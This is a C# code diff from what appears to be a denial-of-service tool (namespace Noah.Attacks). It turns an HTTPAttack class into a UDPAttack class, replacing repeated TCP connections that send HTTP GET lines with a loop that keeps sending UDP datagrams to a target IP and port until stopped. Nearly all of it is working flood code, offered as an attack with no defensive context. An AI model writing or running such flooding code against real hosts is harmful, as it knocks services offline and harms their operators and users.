@@ -1,14 +1,14 @@
 ﻿using System;
-using System.IO;
+using System.Collections.Generic;
+using System.Linq;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading;
-using System.Threading.Tasks;
 
 namespace Noah.Attacks
 {
-    public class HTTPAttack : IAttack
+    public class UDPAttack : IAttack
     {
         public string AttackName { get; private set; }
 
@@ -17,13 +17,9 @@ namespace Noah.Attacks
         private string ip;
         private int port;
 
-        public HTTPAttack(ApplicationState state, string host, int port = 80)
+        public UDPAttack(ApplicationState state, string host, int port = 80)
         {
-            StringBuilder sb = new StringBuilder("GET ");
-            sb.Append(host);
-            sb.AppendLine(" HTTP/1.1");
-
-            message = sb.ToString();
+            message = "abcdefghijklmnopqrstuvwxyz";
             this.state = state;
             ip = host;
             this.port = port;
@@ -38,12 +34,12 @@ namespace Noah.Attacks
         {
             state.State = States.Attacking;
             byte[] bytes = Encoding.ASCII.GetBytes(message);
+            IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), port);
 
             while (state.State != States.Done)
             {
-                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                sock.Connect(ip, port);
-                sock.Send(bytes, SocketFlags.None);
+                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
+                sock.SendTo(bytes, endPoint);
 
                 Thread.Sleep(state.Delay);
             }
